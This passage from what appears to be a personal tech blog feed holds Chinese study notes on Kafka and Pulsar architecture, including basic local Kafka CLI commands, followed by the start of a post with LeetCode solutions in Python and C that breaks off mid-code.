领导者选举的好处在于维护了数据的一致性，避免了消息丢失，但牺牲了高可用性。这就是我们常说的分布式系统的CAP理论。</p><p>Reactor模式：Kafka处理请求的方式。</p><ul><li>Broker中存在一个类似于Reactor中的dispatcher的组件名叫SocketServer，它有对应的Acceptor线程和一个工作线程池。在kafka中这个线程池叫网络线程池。当网络线程拿到请求后，它不是自己处理，而是将请求放到一个共享请求队列中。Broker端还有个IO线程池，负责从该队列中取出请求，执行真正的处理。如果是 PRODUCE 生产请求，则将消息写入到底层的磁盘日志中；如果是 FETCH 请求，则从磁盘或页缓存中读取消息。IO 线程池处中的线程才是执行请求逻辑的线程。请求队列是所有网络线程共享的，而响应队列则是每个网络线程专属的。这么设计的原因就在于，Dispatcher 只是用于请求分发而不负责响应回传，因此只能让每个网络线程自己发送 Response 给客户端，所以这些 Response 也就没必要放在一个公共的地方。</li><li>Purgatory组件：用来缓存延时请求，所谓延时请求，就是那些一时未满足条件不能立刻处理的请求。比如设置了 acks=all 的 PRODUCE 请求，一旦设置了 acks=all，那么该请求就必须等待 ISR 中所有副本都接收了消息后才能返回，此时处理该请求的 IO 线程就必须等待其他 Broker 的写入结果。当请求不能立刻处理时，它就会暂存在 Purgatory 中。稍后一旦满足了完成条件，IO 线程会继续处理该请求，并将 Response 放入对应网络线程的响应队列中。</li></ul><p>Coordinator：Kafka的协调者，专门为Consumer Group服务，负责为 Group 执行 Rebalance 以及提供位移管理和组成员管理等。具体来讲，Consumer 端应用程序在提交位移时，其实是向 Coordinator 所在的 Broker 提交位移。同样地，当 Consumer 应用启动时，也是向 Coordinator 所在的 Broker 发送各种请求，然后由 Coordinator 负责执行消费者组的注册、成员管理记录等元数据管理操作。所有 Broker 在启动时，都会创建和开启相应的 Coordinator 组件。也就是说，所有 Broker 都有各自的 Coordinator 组件。</p><p>Controller：Kafka的核心组件。它的主要作用是在Apache Zookeeper的帮助下管理和协调整个Kafka集群。集群中任意一台Broker都能充当控制器的角色，但在运行过程中，只能有一个Broker成为控制器，行使其管理和协调的职责。</p><p>控制器的功能</p><ul><li>主题管理（创建、删除、增加分区）</li><li>分区重分配：Kafka-reassign-partitions脚本提供的对已有主题分区进行细粒度的分配功能。</li><li>Preferred领导者选举：Kafka为了避免部分Broker负载过重而提供的一种换Leader的方案。</li><li>集群成员管理（新增Broker、Broker主动关闭、Broker宕机）</li><li>数据服务：控制器上保存了最全的集群元数据信息，其他所有Broker会定期接收控制器发来的元数据更新请求，从而更新其内存中的缓存数据。</li></ul><p>Kafka的定时器：kafka基于时间轮的概念自定义实现了一个用于延时功能的定时器(SystemTimer)。可以将插入和删除操作的时间复杂度降为O(1)。例如当配置了acks=all的生产者发送的请求必须确保ISR中的所有副本都成功响应这次写入，这就是所谓的延时请求。</p><p>kafka中使用的请求被延时处理的机制是分层时间轮算法。</p><p>kafka的broker如何实现持久化数据：使用消息日志(Log)来保存数据，一个日志就是磁盘上一个只能追加写消息的物理文件，不过如果不停的向一个日志写消息，最终也会耗尽所有的磁盘空间，因此Kafka通过Log Segment机制，在Kafka底层，一个日志又进一步细分成多个日志段，消息被追加写到当前最新的日志段中，当写满一个日志段后，Kafka会自动切分出一个新的日志段，并将老的日志段封存起来，Kafka 在后台还有定时任务会定期地检查老的日志段是否能够被删除，从而实现回收磁盘空间的目的。</p><p>kafka控制器的选举机制：每个代理节点都会作为ZK的客户端，向ZK服务端尝试创建/controller临时节点。Zookeeper里采用的是Zab共识算法/协议。</p><h4 id="Kafka命令行操作"><a href="#Kafka命令行操作" class="headerlink" title="Kafka命令行操作"></a>Kafka命令行操作</h4><p>查看当前服务器中的所有topic</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --list --zookeeper localhost:2181</span><br></pre></td></tr></table></figure><p>创建topic</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --create --zookeeper localhost:2181 --replication-factor 1 --partitions 1 --topic test</span><br><span class="line"></span><br><span class="line">--topic 定义topic名</span><br><span class="line">--replication-factor 定义副本数</span><br><span class="line">--partitions 定义分区数</span><br></pre></td></tr></table></figure><p>删除topic</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --delete --zookeeper localhost:2181 --topic test</span><br></pre></td></tr></table></figure><p>查看某个topic的详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics --describe --zookeeper localhost:2181 --topic test</span><br></pre></td></tr></table></figure><p>生产消息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-producer --broker-list localhost:9092 --topic test</span><br></pre></td></tr></table></figure><p>消费消息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer --bootstrap-server localhost:9092 --topic test --from-beginning</span><br></pre></td></tr></table></figure><h4 id="Pulsar"><a href="#Pulsar" class="headerlink" title="Pulsar"></a>Pulsar</h4><p>核心思想：计算存储分离</p><p>特点：多租户，易于扩展</p><h4 id="Pulsar核心组件"><a href="#Pulsar核心组件" class="headerlink" title="Pulsar核心组件"></a>Pulsar核心组件</h4><p>Broker：计算层，整个消息层的生产和消费，无存储状态。</p><ul><li>Dispatcher：调度分发模块，承担协议转换、序列化反序列化等。</li><li>Load balancer：负载均衡模块，对访问流量进行控制管理。</li><li>Global replicators：跨集群复制模块，承担异步的跨集群消息同步功能。</li><li>Service discovery：服务发现模块，为每个 topic 选择无状态的主节点。</li></ul><p>BookKeeper：存储层，数据持久化保存的节点，有存储状态。</p><ul><li>Bookie：存储设备</li></ul><p>RocksDB：内嵌在 BookKeeper 中的数据库，存储每个条目的位置索引。</p><p>Zookeeper：元数据管理，存储 Pulsar 和 BookKeeper 元数据 和 节点状态，以及服务发现（发现 broker ，发现bookie）。在 Pulsar 里的作用是存储 Pulsar 系统里元数据的存储和集群的管理以及节点的发现等，节点发现是指发现集群里有多少个 broker，有多少 bookie。</p><ul><li>local zk：负责Pulsar Cluster内部的配置等</li><li>global zk：则用于Pulsar Cluster之间的数据复制等。</li><li>Configuration Store：存储的是集群复制信息，让集群之间互相了解各自的地址。同时还包括一些 clients 或 namespace 的相关配置信息。</li></ul><h4 id="Pulsar订阅模型"><a href="#Pulsar订阅模型" class="headerlink" title="Pulsar订阅模型"></a>Pulsar订阅模型</h4><ul><li>Exclusive（独享）：一个订阅只能有一个消费者消费消息</li><li>Fail-Over（灾备）：一个订阅同时只有一个消费者，可以有多个备份消费者。一旦主消费者故障则备份消费者接管。不会出现同时有两个活跃的消费者。</li><li>Shared（共享）：一个订阅中同时可以有多个消费者，多个消费者共享Topic中的消息。消息通过轮询机制分发给不同的消费者，并且每个消息仅会被分发给一个消费者。当消费者断开连接，所有被发送给它，但没有被确认的消息将被重新安排，分发给其他存活的消费者。</li><li>Key Shared（Key共享）：一个订阅中同时可以有多个消费者，消息在各个使用者之间进行分发，其规则是相同Key的消息仅传递给一个使用者。不管消息被重新发送多少次，它都会被发送到同一消费者。</li></ul><h4 id="Puslar消息路由策略"><a href="#Puslar消息路由策略" class="headerlink" title="Puslar消息路由策略"></a>Puslar消息路由策略</h4><ul><li>单分区：生产者随机挑选一个分区，并将数据写入该分区。</li><li>轮询：生产者通过轮询的方式将数据平均地分布到各个分区上。</li><li>哈希：每个消息会带上一个键，要写入哪个分区取决于它所带的键。</li><li>自定义：生产者使用自定义函数生成分区对应的数值，然后根据这个数值将消息写入对应的分区。</li></ul><p>Pulsar 的数据存储节点 Bookkeeper 被称为 Bookie，相当于一个 Kafka Broker。Ledger 是 Topic 的若干日志的集合，是 Pulsar 数据删除的最小单元，即 Pulsar 每次淘汰以 Ledger 为单位进行删除。Fragment 是 Bookkeeper 的概念，对应一个日志文件，每个 Ledger 由若干 Fragment 组成。</p><h4 id="Pulsar-Broker"><a href="#Pulsar-Broker" class="headerlink" title="Pulsar Broker"></a>Pulsar Broker</h4><p>Pulsar 的 metadata 存储在 zookeeper 上，而消息数据存储在 Bookkeeper 上。Broker 虽然需要这些 metadata，但是其自身并不持久化存储这些数据，所以可以认为是无状态的。不像 Kafka 是在 Partition 级别拥有一个 leader Broker，Pulsar 是在 Topic 级别拥有一个 leader Broker，称之为拥有 Topic 的所有权，针对该 Topic 所有的 R/W 都经过该 Broker 完成。</p><p>Pulsar Broker 可以认为是一种 Proxy，它对 client 屏蔽了服务端读写流程的复杂性，是保证数据一致性与数据负载均衡的重要角色，所以 Pulsar 可以认为是一种基于 Proxy 的分布式系统。与之形成对比的 kafka 可以认为是一种基于 SmartClient 的系统，所以 Kafka 服务端自身的数据一致性流程还需要 Client SDK 与之配合完成。</p><p>Kafka 的所有 Broker 会选出一个 Leader，作为 Broker Leader 决定 Broker 宕机判断、集群扩容、创建删除 Topic、Topic Replica分布、Topic Partition 的 Leader 的选举。Pulsar 的所有 Broker 也会借助 zookeeper 加锁的方式选举一个 Leader【或者称为 Master 更合适，以区分于 Topic 的 Leader】，对 Broker 宕机判断（Failover）、根据 Bookie 集群负载Topic Ledger 所有权【即 Ledger 所在的 Bookie】等任务</p><h4 id="Pulsar-Bookie"><a href="#Pulsar-Bookie" class="headerlink" title="Pulsar Bookie"></a>Pulsar Bookie</h4><p>Pulsar 的底层数据 以 Ledger（上图中的 Segment 就是 Ledger） 形式存储在多个 BookKeeper 上，当集群扩容添加 Bookies 后，Pulsar 会在新的 Bookie 上创建新的 Segment(即 Bookeeper 的 Ledger)，所以不需要再扩容时候像 Kafka 一样进行 Rebalance 操作，其结果就是 Fragments跨多个Bookies以带状分布。但是这样的结果就是同一个 Ledger 的 Fragments 分布在多个 Bookie 上，导致读取和写入会在多个 Bookies 之间跳跃。Topic的 Ledger 和 Fragment 之间映射关系等元数据存储在 Zookeeper 中，Pulsar Broker 需要实时跟踪这些关系进行读写流程。</p><h4 id="Ledgers"><a href="#Ledgers" class="headerlink" title="Ledgers"></a>Ledgers</h4><p>一个Topic实际上是一个ledgers流。Ledger本身就是一个日志。所以一系列的子日志(Ledgers)组成了一个父日志(Topic)。</p><p>Ledgers追加到一个Topic，条目(消息或者一组消息)追加到Ledgers。Ledger一旦关闭是不可变的。Ledger作为最小的删除单元，也就是说我们不能删除单个条目而是去删除整个Ledger。</p><p>Ledgers本身也被分解为多个Fragment。Fragment是BookKeeper集群中最小的分布单元，每个Ledger(由一个或多个Fragment组成)可以跨多个BookKeeper节点(Bookies)进行复制，以实现数据容灾和提升读取性能。每个Fragment都在一组不同的Bookies中复制(存在足够的Bookies)。</p><p>每个Ledger有三个关键配置</p><ul><li>Ensemble Size（E）：Ensemble表示将要写入的实际的Bookies数量</li><li>Write Quorum Size（Qw）：Write Quorum (Qw) 是Pulsar将要写入的实际的Bookies数量。可以等于或者小于Ensemble。</li><li>Ack Quorum Size（Qa）：Ack Quorum (Qa) 是确认写入Bookies的数量，Pulsar Broker将确认发送给客户端。为了一致性，Qa应该是：(Qw + 1) / 2 或者更大。</li></ul><h4 id="Pulsar总结"><a href="#Pulsar总结" class="headerlink" title="Pulsar总结"></a>Pulsar总结</h4><ul><li>每个Topic都有一个归属的Broker</li><li>每个Topic在逻辑上分解为Ledgers、Fragments和Entries。</li><li>Fragments分布在Bookie集群中。Topic与Bookie并不耦合。</li><li>Fragments可以跨多个Bookies带状分布。</li><li>当Pulsar Broker不可用时，该Broker持有的Topic所有权将转移至其他的Broker。Fencing机制避免了同一个Topic当前的Ledger同时有两个所有者(Broker)。</li><li>当Bookie不可用时，自动恢复(如果启用)将自动进行数据重新复制到其他的Bookies。如果禁用，则可以手动启动此过程。</li><li>Broker缓存尾部消息日志，可以非常高效的为尾部读取操作提供服务。</li><li><p>Bookies使用Journal提供持久化保证。该日志可用于故障恢复时恢复尚未写入Entry Log文件的数据。</p></li><li><p>所有Topic的的条目都保存在Entry Log文件中。查找索引保存在RocksDB中。</p></li><li>所有Topic的的条目都保存在Entry Log文件中。查找索引保存在RocksDB中。</li><li>Bookies可以通过单独的磁盘做IO读写分离。</li><li>Zookeeper存储Pulsar和BookKeeper的所有元数据。如果Zookeeper不可用整个Pulsar将不可用。</li><li>存储可以单独扩展。如果存储是瓶颈，那么只需要添加更多的Bookies，他们会自动承担负载，不需要Rebalance。</li></ul><h4 id="Kafka和Pulsar"><a href="#Kafka和Pulsar" class="headerlink" title="Kafka和Pulsar"></a>Kafka和Pulsar</h4><p>Kafka：单片架构模型，服务与存储相结合</p><p>Pulsar：多层架构，可以在单独的层内进行管理</p><p>相对于kafka，这是一个非常不同且复杂的模型。对于kafka，每个Partition副本都完整的存储在kafka节点上。Partition以及Partition副本由一系列的Segment和索引文件组成。kafka模型的优点在于简单快捷。所有读写都是顺序的。不好的是，单个节点必须有足够的磁盘空间来处理副本，因此非常大的副本可能会迫使你是用非常大的磁盘。第二个缺点是，在集群扩展时必须做Rebalance。这个过程是比较痛苦的，需要良好的计划和执行来保证没有任何故障的情况下分散节点的存储压力。</p><p>在Pulsar+BookKeeper模型中，Topic中的数据分布在多个Bookies上。Topic被分割成Ledgers，Ledgers被分割成Fragments分布在Fragment使用的Bookies上。当需要做集群扩展时，只需添加更多Bookies，它们就会在创建新的Fragment时开始在的Bookies上写入数据，不再需要kafka的Rebalance操作。</p><h4 id="事务区别"><a href="#事务区别" class="headerlink" title="事务区别"></a>事务区别</h4><p>RocketMQ中的事务，它解决的问题是，确保执行本地事务和发消息这两个操作，要么都成功，要么都失败。并且RocketMQ增加了一个事务反查的机制，来尽量提高事务执行的成功率和数据一致性。</p><p>Kafka 中的事务，它解决的问题是，确保在一个事务中发送的多条消息，要么都成功，要么都失败。（这里面的多条消息不一定要在同一个主题和分区中，可以是发往多个主题和分区的消息）当然也可以在kafka事务执行过程中开启本地事务来实现类似RocketMQ事务消息的效果，但是Kafka是没有事务消息反查机制的，它是直接抛出异常的，用户可以根据异常来实现自己的重试等方法保证事务正常运行。</p><p>它们的共同点就是：都是通过两阶段提交来实现事务的，事务消息都保存在单独的主题上。不同的地方就是RocketMQ是通过“半消息”来实现的，kafka是直接将消息发送给对应的topic，通过客户端来过滤实现的。而且它们两个使用的场景区别是非常之大的，RockteMQ主要解决的是基于本地事务和消息的数据一致性，而Kafka的事务则是用于实现它的Exactly-once机制，应用于实时流计算的场景中。</p><p>Pulsar的事务消息和Kafka应用场景和语义类似，只是由于底层实现机制有差别，在一些细节上有区别。</p><p>参考资料：</p><p><a href="http://matt33.com/2019/01/28/bk-store-realize/" target="_blank" rel="noopener">http://matt33.com/2019/01/28/bk-store-realize/</a></p><p><a href="https://mp.weixin.qq.com/s/CIpCLCxqpLoQVUKz6QeDJQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/CIpCLCxqpLoQVUKz6QeDJQ</a></p><p><a href="https://alexstocks.github.io/html/pulsar.html" target="_blank" rel="noopener">https://alexstocks.github.io/html/pulsar.html</a></p><p><a href="https://segmentfault.com/a/1190000023605433" target="_blank" rel="noopener">https://segmentfault.com/a/1190000023605433</a></p><p><a href="https://segmentfault.com/a/1190000038173886" target="_blank" rel="noopener">https://segmentfault.com/a/1190000038173886</a></p><p><a href="https://blog.csdn.net/shijinghan1126/article/details/117418520" target="_blank" rel="noopener">https://blog.csdn.net/shijinghan1126/article/details/117418520</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;消息队列MQ&quot;&gt;&lt;a href=&quot;#消息队列MQ&quot; class=&quot;headerlink&quot; title=&quot;消息队列MQ&quot;&gt;&lt;/a&gt;消息队列MQ&lt;/h4&gt;&lt;p&gt;中间件：位于操作系统之上，客户应用系统之下的中间层，针对某些特定的领域抽取他们的共性部分独立出来的一套组件，
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>腾讯精选练习50题(LeetCode)</title>
    <link href="elssm.github.io/2021/06/24/%E8%85%BE%E8%AE%AF%E7%B2%BE%E9%80%89%E7%BB%83%E4%B9%A050%E9%A2%98-LeetCode/"/>
    <id>elssm.github.io/2021/06/24/腾讯精选练习50题-LeetCode/</id>
    <published>2021-06-24T05:40:34.000Z</published>
    <updated>2021-06-24T06:28:58.108Z</updated>
    
    <content type="html"><![CDATA[<h4 id="两数相加-medium"><a href="#两数相加-medium" class="headerlink" title="两数相加(medium)"></a>两数相加(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, val=0, next=None):</span></span><br><span class="line"><span class="comment">#         self.val = val</span></span><br><span class="line"><span class="comment">#         self.next = next</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        c1=[]</span><br><span class="line">        c2=[]</span><br><span class="line">        <span class="keyword">while</span> l1:</span><br><span class="line">            c1.append(l1.val)</span><br><span class="line">            l1=l1.next</span><br><span class="line">        <span class="keyword">while</span> l2:</span><br><span class="line">            c2.append(l2.val)</span><br><span class="line">            l2=l2.next</span><br><span class="line">        j1=<span class="number">-1</span></span><br><span class="line">        j2=<span class="number">-1</span></span><br><span class="line">        sum1=<span class="number">0</span></span><br><span class="line">        sum2=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c1)):</span><br><span class="line">            sum1=sum1*<span class="number">10</span>+c1[j1]</span><br><span class="line">            j1=j1<span class="number">-1</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c2)):</span><br><span class="line">            sum2=sum2*<span class="number">10</span>+c2[j2]</span><br><span class="line">            j2=j2<span class="number">-1</span></span><br><span class="line">        res=sum1+sum2</span><br><span class="line">        p=head=node=ListNode(<span class="literal">None</span>)</span><br><span class="line">        l=len(str(res))</span><br><span class="line">        <span class="keyword">while</span> l:</span><br><span class="line">            node=ListNode(res%<span class="number">10</span>)</span><br><span class="line">            p.next=node</span><br><span class="line">            p=node</span><br><span class="line">            res/=<span class="number">10</span></span><br><span class="line">            l-=<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> head.next</span><br></pre></td></tr></table></figure><h4 id="寻找两个正序数组的中位数-hard"><a href="#寻找两个正序数组的中位数-hard" class="headerlink" title="寻找两个正序数组的中位数(hard)"></a>寻找两个正序数组的中位数(hard)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">findMedianSortedArrays</span><span class="params">(self, nums1, nums2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :rtype: float</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> nums2:</span><br><span class="line">            nums1.append(i)</span><br><span class="line">        nums1 = sorted(nums1)</span><br><span class="line">        <span class="keyword">if</span> len(nums1)%<span class="number">2</span> !=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> nums1[len(nums1)/<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> (nums1[len(nums1)/<span class="number">2</span>]+nums1[len(nums1)/<span class="number">2</span><span class="number">-1</span>])/<span class="number">2.0</span></span><br></pre></td></tr></table></figure><h4 id="最长回文子串-medium"><a href="#最长回文子串-medium" class="headerlink" title="最长回文子串(medium)"></a>最长回文子串(medium)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">longestPalindrome</span><span class="params">(<span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,t,n,l;</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> a=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>* ret = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="number">1001</span>);</span><br><span class="line">    <span class="built_in">memset</span>(ret,<span class="number">0</span>,<span class="number">1001</span>);</span><br><span class="line"><span class="comment">//int m[1000];</span></span><br><span class="line"><span class="comment">//char *m=(char *)malloc(sizeof(char)*strlen(s));</span></span><br><span class="line">t=<span class="built_in">strlen</span>(s); </span><br><span class="line"><span class="keyword">for</span>(i=t;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;t-i+<span class="number">1</span>;j++)&#123;</span><br><span class="line">count=<span class="number">0</span>;</span><br><span class="line">n=j+i<span class="number">-1</span>;</span><br><span class="line"><span class="keyword">for</span>(k=j;k&lt;i/<span class="number">2</span>+j;k++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[k]==s[n--])&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(count==i/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(count==i/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(l=j;l&lt;j+i;l++)&#123;</span><br><span class="line">ret[a++]=s[l];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="整数反转-easy"><a href="#整数反转-easy" class="headerlink" title="整数反转(easy)"></a>整数反转(easy)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">int</span> t,sum=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">  t=x%<span class="number">10</span>;</span><br><span class="line">  x=x/<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum&gt;<span class="number">2147483647</span>/<span class="number">10</span>||(sum==<span class="number">2147483647</span>/<span class="number">10</span> &amp;&amp; t&gt;<span class="number">7</span>))</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum&lt;<span class="number">-2147483648</span>/<span class="number">10</span>||(sum==<span class="number">-2147483648</span>/<span class="number">10</span> &amp;&amp; t&lt;<span class="number">-8</span>))</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     sum=sum*<span class="number">10</span>+t;</span><br><span class="line">      &#125;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="字符串转换整数-medium"><a href="#字符串转换整数-medium" class="headerlink" title="字符串转换整数(medium)"></a>字符串转换整数(medium)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">myAtoi</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        res=<span class="string">""</span></span><br><span class="line">        flag=<span class="number">1</span></span><br><span class="line">        temp1=[<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>]</span><br><span class="line">        temp2=[<span class="string">"-"</span>,<span class="string">"+"</span>]</span><br><span class="line">        temp=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">            <span class="keyword">if</span> s[i]!=<span class="string">" "</span>:</span><br><span class="line">                temp=i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        s=s[temp:]</span><br><span class="line">        <span class="keyword">if</span> len(s)==<span class="number">0</span> <span class="keyword">or</span> (s[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> temp1 <span class="keyword">and</span> s[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> temp2):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> s[<span class="number">0</span>] <span class="keyword">in</span> temp1:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)):</span><br><span class="line">                <span class="keyword">if</span> s[i] <span class="keyword">in</span> temp1:</span><br><span class="line">                    res += s[i]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> int(res) - <span class="number">2147483647</span> &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> 